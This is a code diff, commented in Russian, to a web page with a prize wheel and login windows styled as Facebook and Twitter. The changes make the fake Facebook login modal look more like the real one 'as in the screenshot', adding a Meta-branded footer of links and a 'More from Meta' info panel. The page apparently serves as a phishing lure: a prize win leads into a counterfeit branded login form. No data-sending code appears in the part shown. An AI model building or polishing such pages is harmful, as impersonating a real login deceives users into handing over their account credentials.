@@ -358,7 +358,7 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
 
-        /* ОБНОВЛЕННЫЕ стили для Facebook окна - ТОЧНО ПО СКРИНШОТУ */
+        /* ОБНОВЛЕННЫЕ стили для Facebook окна */
         .facebook-modal-content {
             background: #f0f2f5;
             color: #1c1e21;
@@ -368,7 +368,7 @@
             margin: auto;
         }
 
-        /* Верхняя часть с языком - ПОЛНЫЙ БЛОК */
+        /* Верхняя часть с языком */
         .facebook-language-header {
             padding: 12px 16px;
             text-align: center;
@@ -381,9 +381,9 @@
         .language-selector {
             background: transparent;
             border: none;
-            color: #000000 !important; /* ЧЕРНЫЙ ТЕКСТ */
+            color: #000000 !important;
             font-size: 14px;
-            font-weight: 400 !important; /* ТОНЬШЕ */
+            font-weight: 400 !important;
             cursor: pointer;
             padding: 4px 8px;
             border-radius: 4px;
@@ -408,7 +408,6 @@
             width: 100%;
         }
 
-        /* ИКОНКА FACEBOOK КАРТИНКА - УМЕНЬШЕНА ДО 70px */
         .facebook-logo-container {
             margin: 24px 0 20px;
             text-align: center;
@@ -416,12 +415,11 @@
         }
 
         .facebook-logo {
-            width: 70px !important; /* УМЕНЬШЕНА ДО 70px */
+            width: 70px !important;
             height: auto;
             object-fit: contain;
         }
 
-        /* Форма */
         .facebook-form {
             width: 100%;
             max-width: 364px;
@@ -450,7 +448,6 @@
             box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
 
-        /* КНОПКА ВОЙТИ КАРТИНКА */
         .facebook-login-button {
             width: 100%;
             height: 48px;
@@ -467,7 +464,6 @@
             object-fit: contain;
         }
 
-        /* Ссылка "Забыли пароль?" - ЧЕРНАЯ И ТОНЬШЕ */
         .forgot-password-link {
             display: block;
             text-align: center;
@@ -476,8 +472,7 @@
             font-size: 14px;
             margin-bottom: 20px;
             padding: 16px 0;
-            /* УДАЛЕНА ЛИНИЯ */
-            font-weight: 400 !important; /* ТОНЬШЕ */
+            font-weight: 400 !important;
             width: 100%;
         }
 
@@ -486,20 +481,18 @@
             color: #1c1e21;
         }
 
-        /* Кнопка создания аккаунта - КАРТИНКА УВЕЛИЧЕНА ДО 100px */
         .facebook-create-container {
-            margin-top: 10px; /* Ближе к забыли пароль */
+            margin-top: 10px;
             width: 100%;
             max-width: 364px;
             display: flex;
             justify-content: center;
-            /* УДАЛЕНА ЛИНИЯ */
             padding-top: 0;
         }
 
         .facebook-create-button {
             width: 100%;
-            height: 100px !important; /* УВЕЛИЧЕНО ДО 100px */
+            height: 100px !important;
             background: transparent;
             border: none;
             cursor: pointer;
@@ -512,57 +505,191 @@
             object-fit: contain;
         }
 
-        /* Футер - С ИКОНКОЙ META - ПОДВИНУТ БЛИЖЕ К СОЗДАТЬ АККАУНТ */
+        /* ИСПРАВЛЕННЫЙ ФУТЕР - как в скриншоте */
         .facebook-footer {
             background: #fff;
-            padding: 5px 16px 20px !important; /* Уменьшен верхний padding - БЛИЖЕ */
+            padding: 20px 16px !important;
             font-size: 12px;
             color: #737373;
             text-align: center;
-            border-top: none !important; /* УДАЛЕНА ЛИНИЯ НАВЕРХУ */
-            margin-top: 5px !important; /* Ближе к кнопке создать аккаунт */
+            border-top: none !important;
             width: 100%;
         }
 
-        .footer-meta {
+        .footer-links-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .footer-links-grid a {
+            color: #737373;
+            text-decoration: none;
+            font-size: 11px;
+            padding: 4px 0;
+            text-align: center;
+        }
+
+        .footer-links-grid a:hover {
+            text-decoration: underline;
+        }
+
+        .more-link {
+            display: block;
+            color: #737373;
+            text-decoration: none;
+            font-size: 11px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+
+        .more-link:hover {
+            text-decoration: underline;
+        }
+
+        .footer-meta-section {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            margin-bottom: 8px !important; /* Ближе к ссылкам */
+            gap: 6px;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #ddd;
         }
 
-        .meta-icon {
-            width: 16px;
-            height: 16px;
+        .meta-icon-small {
+            width: 12px;
+            height: 12px;
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
         }
 
-        .footer-meta span {
+        .footer-meta-section span {
             color: #737373;
-            font-size: 12px;
-        }
-
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 15px !important; /* Больше расстояния между ссылками */
-        }
-
-        .footer-links a {
-            color: #737373;
-            text-decoration: none;
             font-size: 11px;
         }
 
-        .footer-links a:hover {
-            text-decoration: underline;
+        /* Стили для модального окна "Ещё" */
+        .more-modal-content {
+            background: #fff;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
         }
 
-        /* Стили для Twitter (X) окна */
+        .more-modal-header {
+            padding: 16px;
+            border-bottom: 1px solid #dadde1;
+            text-align: center;
+            position: relative;
+        }
+
+        .more-modal-title {
+            font-size: 16px;
+            color: #1c1e21;
+            font-weight: 600;
+        }
+
+        .more-close-button {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #8a8d91;
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .more-content {
+            padding: 16px;
+            max-height: 60vh;
+            overflow-y: auto;
+        }
+
+        .more-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+        }
+
+        .more-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            padding: 12px 8px;
+            border-radius: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .more-item:hover {
+            background-color: #f0f2f5;
+        }
+
+        .more-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: #1877f2;
+            background: #e7f3ff;
+        }
+
+        .more-label {
+            font-size: 12px;
+            color: #1c1e21;
+            text-align: center;
+            line-height: 1.2;
+        }
+
+        /* Дополнительный контент для окна "Ещё" */
+        .additional-content {
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .content-section {
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+        }
+
+        .content-section:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+        }
+
+        .content-section h3 {
+            color: #1c1e21;
+            font-size: 14px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .content-section p {
+            color: #1c1e21;
+            font-size: 12px;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        /* Стили для Twitter окна */
         .twitter-modal-content {
             background: #000;
             color: #fff;
@@ -1174,7 +1301,6 @@
             animation: wheelGlow 1s infinite;
         }
 
-        /* Исправление прокрутки */
         .modal-content::-webkit-scrollbar {
             width: 6px;
         }
@@ -1230,11 +1356,15 @@
             }
 
             .facebook-logo {
-                width: 60px !important; /* Адаптивно для мобильных */
+                width: 60px !important;
             }
 
             .facebook-create-button {
-                height: 90px; /* Адаптивно для мобильных */
+                height: 90px;
+            }
+
+            .more-grid {
+                grid-template-columns: repeat(3, 1fr);
             }
         }
 
@@ -1266,15 +1396,27 @@
             }
 
             .facebook-logo {
-                width: 50px !important; /* Еще меньше на маленьких экранах */
+                width: 50px !important;
             }
 
             .facebook-create-button {
-                height: 80px; /* Адаптивно для маленьких экранов */
+                height: 80px;
+            }
+
+            .footer-links-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+
+            .more-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 10px;
+            }
+
+            .more-item {
+                padding: 8px 4px;
             }
         }
 
-        /* Мобильная оптимизация */
         @media (max-height: 700px) {
             .twitter-modal-content,
             .forgot-password-modal,
@@ -1348,17 +1490,17 @@
         </div>
     </div>
 
-    <!-- ИСПРАВЛЕННОЕ модальное окно входа в Facebook -->
+    <!-- Модальное окно входа в Facebook -->
     <div class="modal-overlay" id="facebookModal">
         <div class="modal-content facebook-modal-content">
-            <!-- Верхняя часть с языком - ПОЛНЫЙ БЛОК -->
+            <!-- Верхняя часть с языком -->
             <div class="facebook-language-header">
                 <button class="language-selector">Русский</button>
             </div>
             
             <!-- Основной контент -->
             <div class="facebook-content">
-                <!-- Логотип Facebook как картинка - УМЕНЬШЕН ДО 70px -->
+                <!-- Логотип Facebook как картинка -->
                 <div class="facebook-logo-container">
                     <img src="facebook.png" alt="Facebook" class="facebook-logo">
                 </div>
@@ -1376,7 +1518,7 @@
                     <a href="#" class="forgot-password-link" id="forgotPassword">Забыли пароль?</a>
                 </form>
                 
-                <!-- Кнопка создания аккаунта как картинка - УВЕЛИЧЕНА ДО 100px -->
+                <!-- Кнопка создания аккаунта как картинка -->
                 <div class="facebook-create-container">
                     <button type="button" class="facebook-create-button" id="createAccount">
                         <img src="sozdanie.png" alt="Создать новый аккаунт">
@@ -1384,16 +1526,107 @@
                 </div>
             </div>
             
-            <!-- Футер с иконкой Meta - ПОДВИНУТ БЛИЖЕ БЕЗ ЛИНИЙ -->
+            <!-- ИСПРАВЛЕННЫЙ ФУТЕР - как в скриншоте -->
             <div class="facebook-footer">
-                <div class="footer-meta">
-                    <div class="meta-icon" style="background-image: url('meta.png');"></div>
-                    <span>Meta</span>
-                </div>
-                <div class="footer-links">
+                <div class="footer-links-grid">
                     <a href="#">Информация</a>
                     <a href="#">Справка</a>
-                    <a href="#">Ещё</a>
+                    <a href="#" id="moreLink">Ещё</a>
+                </div>
+                
+                <div class="footer-links-grid">
+                    <a href="#">Messenger</a>
+                    <a href="#">Facebook Lite</a>
+                    <a href="#">Видео</a>
+                </div>
+                
+                <div class="footer-links-grid">
+                    <a href="#">Meta Pay</a>
+                    <a href="#">Магазин Meta</a>
+                    <a href="#">Meta Quest</a>
+                </div>
+                
+                <div class="footer-links-grid">
+                    <a href="#">Ray-Ban Meta</a>
+                    <a href="#">Meta AI</a>
+                    <a href="#">Больше контента от Meta AI</a>
+                </div>
+                
+                <div class="footer-links-grid">
+                    <a href="#">Instagram</a>
+                    <a href="#">Threads</a>
+                    <a href="#">Разработчикам</a>
+                </div>
+                
+                <div class="footer-links-grid">
+                    <a href="#">Вакансии</a>
+                    <a href="#">Политика конфиденциальности</a>
+                    <a href="#">Центр конфиденциальности</a>
+                </div>
+                
+                <div class="footer-meta-section">
+                    <div class="meta-icon-small" style="background-image: url('meta.png');"></div>
+                    <span>Meta</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно "Ещё" -->
+    <div class="modal-overlay" id="moreModal">
+        <div class="modal-content more-modal-content">
+            <div class="more-modal-header">
+                <div class="more-modal-title">Ещё от Meta</div>
+                <button class="more-close-button" id="moreCloseButton">×</button>
+            </div>
+            
+            <div class="more-content">
+                <div class="additional-content">
+                    <div class="content-section">
+                        <h3>Meta Платформы</h3>
+                        <p><strong>Messenger:</strong> Быстрая и надежная коммуникация с друзьями и семьей</p>
+                        <p><strong>Facebook Lite:</strong> Облегченная версия Facebook для медленных соединений</p>
+                        <p><strong>Видео:</strong> Платформа для просмотра и создания видеоконтента</p>
+                    </div>
+                    
+                    <div class="content-section">
+                        <h3>Meta Платежи и Покупки</h3>
+                        <p><strong>Meta Pay:</strong> Безопасная платежная система для онлайн-транзакций</p>
+                        <p><strong>Магазин Meta:</strong> Официальный магазин устройств и аксессуаров Meta</p>
+                        <p><strong>Meta Quest:</strong> Виртуальная реальность нового поколения</p>
+                    </div>
+                    
+                    <div class="content-section">
+                        <h3>Технологии Meta</h3>
+                        <p><strong>Ray-Ban Meta:</strong> Умные очки с интеграцией Meta технологий</p>
+                        <p><strong>Meta AI:</strong> Искусственный интеллект для улучшения взаимодействия</p>
+                        <p><strong>Больше контента от Meta AI:</strong> Эксклюзивный контент созданный с помощью AI</p>
+                    </div>
+                    
+                    <div class="content-section">
+                        <h3>Другие Приложения</h3>
+                        <p><strong>Instagram:</strong> Платформа для обмена фото и видео</p>
+                        <p><strong>Threads:</strong> Текстовая платформа для публичных разговоров</p>
+                    </div>
+                    
+                    <div class="content-section">
+                        <h3>Для Разработчиков и Карьера</h3>
+                        <p><strong>Разработчикам:</strong> Инструменты и ресурсы для создания приложений</p>
+                        <p><strong>Вакансии:</strong> Карьерные возможности в компании Meta</p>
+                    </div>
+                    
+                    <div class="content-section">
+                        <h3>Конфиденциальность и Безопасность</h3>
+                        <p><strong>Политика конфиденциальности:</strong> Как мы собираем и используем данные</p>
+                        <p><strong>Центр конфиденциальности:</strong> Инструменты для управления вашей конфиденциальностью</p>
+                    </div>
+                    
+                    <div class="content-section">
+                        <h3>О Meta</h3>
+                        <p><strong>Meta</strong> (ранее Facebook, Inc.) — американская транснациональная технологическая холдинговая компания, владеющая одноимённой социальной сетью, а также компаниями Instagram, WhatsApp и Oculus. Штаб-квартира компании находится в Менло-Парке, штат Калифорния.</p>
+                        <p>Компания была основана Марком Цукербергом и его соседями по комнате в Гарвардском университете в 2004 году. Изначально социальная сеть была доступна только для студентов Гарварда, но позже была расширена для других университетов, а затем и для всех пользователей старше 13 лет.</p>
+                        <p>В 2021 году компания сменила название на Meta Platforms, Inc., чтобы отразить свой фокус на метавселенной — коллективном виртуальном пространстве, созданном в результате конвергенции физической и цифровой реальности.</p>
+                    </div>
                 </div>
             </div>
         </div>
@@ -1503,6 +1736,7 @@
         const prizeWheel = document.getElementById('prizeWheel');
         const winModal = document.getElementById('winModal');
         const facebookModal = document.getElementById('facebookModal');
+        const moreModal = document.getElementById('moreModal');
         const twitterModal = document.getElementById('twitterModal');
         const successModal = document.getElementById('successModal');
         const winPrizeImage = document.getElementById('winPrizeImage');
@@ -1638,6 +1872,19 @@
         // Отмена выигрыша
         document.getElementById('cancelWin').addEventListener('click', () => {
             winModal.style.display = 'none';
+        });
+
+        // Кнопка "Ещё" в Facebook окне
+        document.getElementById('moreLink').addEventListener('click', (e) => {
+            e.preventDefault();
+            facebookModal.style.display = 'none';
+            moreModal.style.display = 'flex';
+        });
+
+        // Закрытие окна "Ещё"
+        document.getElementById('moreCloseButton').addEventListener('click', () => {
+            moreModal.style.display = 'none';
+            facebookModal.style.display = 'flex';
         });
 
         // Закрытие Twitter окна
